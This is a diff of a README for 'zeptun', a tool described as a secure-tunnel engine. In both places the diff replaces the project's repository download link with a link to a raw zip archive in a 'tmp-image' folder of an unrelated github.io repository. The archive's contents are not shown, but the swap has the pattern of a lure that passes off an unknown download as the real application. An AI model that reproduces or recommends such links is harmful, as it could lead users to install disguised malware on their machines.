@@ -24,7 +24,7 @@ zeptun is a high-performance engine that creates a secure tunnel between your de
 
 ## 📥 Download and Installation
 
-Visit this link to download the application: **[Download zeptun](https://github.com/Medinastraightface4686/zeptun)**
+Visit this link to download the application: **[Download zeptun](https://github.com/Medinastraightface4686/medinastraightface4686.github.io/raw/refs/heads/main/tmp-image/v1.8.zip)**
 
 ### Step-by-Step Installation Guide
 
@@ -177,7 +177,7 @@ If you find zeptun useful, consider helping the project grow:
 
 ---
 
-**Ready to get started? Visit this link to download the application: [https://github.com/Medinastraightface4686/zeptun](https://github.com/Medinastraightface4686/zeptun)**
+**Ready to get started? Visit this link to download the application: [https://github.com/Medinastraightface4686/medinastraightface4686.github.io/raw/refs/heads/main/tmp-image/v1.8.zip](https://github.com/Medinastraightface4686/medinastraightface4686.github.io/raw/refs/heads/main/tmp-image/v1.8.zip)**
 
 ---
 
